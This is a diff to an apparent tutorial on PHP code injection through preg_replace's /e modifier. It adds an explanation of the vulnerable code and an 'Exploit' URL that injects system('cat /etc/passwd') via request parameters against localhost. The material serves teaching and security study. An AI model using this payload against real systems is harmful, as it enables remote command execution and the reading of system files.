@@ -27,7 +27,12 @@ allows user  to control the value passed via name paramater allowing attacker to
 ```
 preg_replace is a function in php that is used to replace a string with another string based on pattern. In older version of php if we add full controller pattern we can add modifier and  after replacement we can use modifier to eval result as a php code.
 ```
+
+
 #### Vulnerable Code
+
+Here a value is taken from paramater base, matches the pattern with string "user" and if the pattern matched, it replaces the string with test. Upon
+adding e flag after regex the application executes the final string test as a php code.
 
 ```
 <?php
@@ -42,5 +47,6 @@ preg_replace is a function in php that is used to replace a string with another 
 ?>
 ```
 
-
+#### Exploit 
+http://localhost/?new=system('cat /etc/passwd')&pattern=/user/e&base=Hello user
 
